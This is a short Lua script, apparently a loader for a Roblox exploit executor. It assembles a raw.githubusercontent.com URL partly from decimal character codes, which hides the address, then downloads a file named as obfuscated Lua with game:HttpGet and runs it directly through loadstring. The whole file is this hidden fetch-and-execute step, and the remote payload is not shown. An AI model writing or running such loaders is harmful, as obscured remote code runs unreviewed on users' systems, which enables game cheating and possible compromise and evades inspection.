
local function buildROX()
    local parts = {
        "https://raw.",
        {103,105,116,104,117,98},
        "usercontent.com/",
        {112,112,112,108,108,108,111,111,111,52,57,50},
        "-art/-/refs/heads/main/",
        {82,79,88,95,77,86,95},
        "numeric_obfuscated",
        {46,108,117,97}
    }

    local result = {}

    for _, part in ipairs(parts) do
        if type(part) == "table" then
            for _, byte in ipairs(part) do
                result[#result + 1] = string.char(byte)
            end
        else
            result[#result + 1] = part
        end
    end

    return table.concat(result)
end

local url = buildROX()
local response = game:HttpGet(url)
local execute, err = loadstring(response)

if not execute then
    error(err)
end

execute()
